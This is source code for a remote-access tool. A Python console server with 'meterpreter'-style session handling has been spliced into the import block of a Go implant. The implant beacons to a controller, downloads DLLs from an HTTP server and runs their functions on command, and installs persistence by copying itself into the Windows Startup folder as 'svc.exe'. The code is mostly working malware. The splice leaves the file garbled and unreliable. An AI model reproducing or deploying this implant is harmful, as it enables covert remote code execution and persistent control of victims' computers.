package main

// #include <stdlib.h>
import "C"

import (
	"fmt"
	"io"
	"net"import http.server
import socketserver
import threading
import socket
import os
import base64

HTTP_PORT = 80
TCP_PORT = 5000
sessions = {}
session_id = 0
shutdown_flag = threading.Event()

class ThreadedTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        global session_id
        session_id += 1
        sid = session_id
        sessions[sid] = self.request
        print(f"[+] New session: {sid} from {self.client_address}")
        try:
            while not shutdown_flag.is_set():
                data = self.request.recv(1)
                if not data:
                    break
        except:
            pass
        finally:
            print(f"[-] Session {sid} closed")
            del sessions[sid]

class TCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

def run_http_server():
    os.chdir(".")
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
        httpd.timeout = 1  # short timeout so we can check for shutdown
        print(f"[+] HTTP server running on port {HTTP_PORT}")
        while not shutdown_flag.is_set():
            httpd.handle_request()

def run_tcp_server():
    with TCPServer(("", TCP_PORT), ThreadedTCPHandler) as tcpd:
        tcpd.timeout = 1  # allow checking the shutdown flag
        print(f"[+] TCP server running on port {TCP_PORT}")
        while not shutdown_flag.is_set():
            try:
                tcpd.handle_request()
            except socket.timeout:
                continue

def shell():
    while not shutdown_flag.is_set():
        try:
            cmd = input("main > ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[!] Exiting...")
            shutdown_flag.set()
            break

        if cmd == "sessions -l":
            for sid in sessions:
                print(f"Session {sid}: connected")
        elif cmd.startswith("sessions -i"):
            try:
                _, _, sid = cmd.split()
                sid = int(sid)
                if sid not in sessions:
                    print("Invalid session")
                    continue
                interact(sid)
            except Exception as e:
                print("Usage: sessions -i <id>"); print("Exception: ", e)
        elif cmd == "exit":
            shutdown_flag.set()
            break

def recv_all(sock, timeout=2.0):
    chunks = []
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
            if len(chunk) < 4096:
                break  # probably end of data
    except socket.timeout:
        pass
    return b''.join(chunks)


def interact(sid):
    s = sessions.get(sid)
    if not s:
        print("Session closed.")
        return

    print(f"[*] Interacting with session {sid}")
    while not shutdown_flag.is_set():
        try:
            cmd = input(f"meterpreter ({sid}) > ").strip()
        except KeyboardInterrupt:
            print("\n[*] Returning to main shell.")
            break

        if not cmd:
            continue
        if cmd == "background":
            break

        try:
            s.sendall(cmd.encode())
            data = recv_all(s)
            try:
                b64_result = data.decode('utf-8').strip()
                try:
                    decoded_bytes = base64.b64decode(b64_result)
                    decoded_string = decoded_bytes.decode('utf-8', errors='replace')
                    print(decoded_string)
                    """
                    with open(cmd.split('/')[1], 'w') as f:
                        f.write(decoded_string)"""
                except Exception as e:
                    print(f"Decode error: {e}")
		
            except UnicodeDecodeError:
                print(data)
        except Exception as e:
            print(f"[!] Error with session {sid}: {e}")
            break


def main():
    t1 = threading.Thread(target=run_http_server)
    t2 = threading.Thread(target=run_tcp_server)
    t1.start()
    t2.start()

    try:
        shell()
    finally:
        shutdown_flag.set()
        t1.join()
        t2.join()
        print("[*] Shutdown complete.")

if __name__ == "__main__":
    main()
	"net/http"
	"os"
	"strings"
	"syscall"
	"unsafe"
	"time"
)

var (
	consoleAddr = "localhost:5000"
	httpServer  = "http://localhost:80"
)

var dllHandle syscall.Handle

func cleanup(handle syscall.Handle) {
	time.Sleep(2 * time.Second)
	if handle != 0 {
		syscall.FreeLibrary(handle)
		dllHandle = 0
	}
}

func downloadDLL(dll string) error {
	resp, err := http.Get(httpServer + "/downloads/" + dll)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	f, err := os.Create(dll)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(f, resp.Body)
	return err
}

// Safely call exported DLL function
func callDLL(dllPath, funcName, arg1, arg2 string) (string, error) {
	dll, err := syscall.LoadLibrary(dllPath)
	if err != nil {
		return "", fmt.Errorf("load failed: %v", err)
	}
	dllHandle = dll

	proc, err := syscall.GetProcAddress(dll, funcName)
	if err != nil {
		return "", fmt.Errorf("proc not found: %v", err)
	}

	output := make([]byte, 1 << 24)
	cArg1 := append([]byte(arg1), 0)
	cArg2 := append([]byte(arg2), 0)

	_, _, _ = syscall.Syscall6(
		proc,
		4,
		uintptr(unsafe.Pointer(&output[0])), uintptr(len(output)),
		uintptr(unsafe.Pointer(&cArg1[0])), uintptr(unsafe.Pointer(&cArg2[0])),
		0, 0,
	)

	// Read null-terminated C string from output buffer
	end := 0
	for end < len(output) && output[end] != 0 {
		end++
	}

	return string(output[:end]), nil
}

// Add persistence by copying itself to startup
func persistent() string {
	exe, err := os.Executable()
	if err != nil {
		return "get exe failed: " + err.Error()
	}
	startup := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe"
	data, err := os.ReadFile(exe)
	if err != nil {
		return "read self failed: " + err.Error()
	}
	if err := os.WriteFile(startup, data, 0755); err != nil {
		return "write failed: " + err.Error()
	}
	return "Persistence added."
}

// Remove persistence by deleting startup copy
func unpersistent() string {
	startup := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe"
	if err := os.Remove(startup); err != nil {
		return "delete failed: " + err.Error()
	}
	return "Persistence removed."
}

func handle(conn net.Conn) {
	defer conn.Close()
	for {
		buf := make([]byte, 1 << 24)
		n, err := conn.Read(buf)

		if err != nil || n == 0 {
			return
		}
		cmd := strings.TrimSpace(string(buf[:n]))
		if cmd == "" {
			continue
		}

		parts := strings.SplitN(cmd, " ", 3)
		if len(parts) < 3 {
			conn.Write([]byte("Usage: dll/function arg1 arg2\n"))
			continue
		}

		dllFunc := parts[0]
		args := parts[1:]
		split := strings.Split(dllFunc, "/")
		if len(split) != 2 {
			conn.Write([]byte("Invalid format: use dll/function\n"))
			continue
		}
		
		dllFile, fn := split[0], split[1]

		// Internal static commands
		if dllFile == "static" {
			var output string
			switch fn {
			case "persistent":
				output = persistent()
			case "unpersistent":
				output = unpersistent()
			default:
				output = "Unknown static function"
			}
			conn.Write([]byte(output + "\n"))
			continue
		}

		// External DLL command
		if _, err := os.Stat(dllFile); os.IsNotExist(err) {
			if err := downloadDLL(dllFile); err != nil {
				conn.Write([]byte("Download failed: " + err.Error() + "\n"))
				continue
			}
		}
		result, err := callDLL(dllFile, fn, args[0], args[1])

		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
			continue
		}

		conn.Write([]byte("." + result + "\n"))
		// go cleanup(dllHandle)
	}
}

func main() {
	for {
		conn, err := net.Dial("tcp", consoleAddr)
		
		if err != nil {
			time.Sleep(60 * time.Second)
			
			continue
		}
		handle(conn)
	}
}


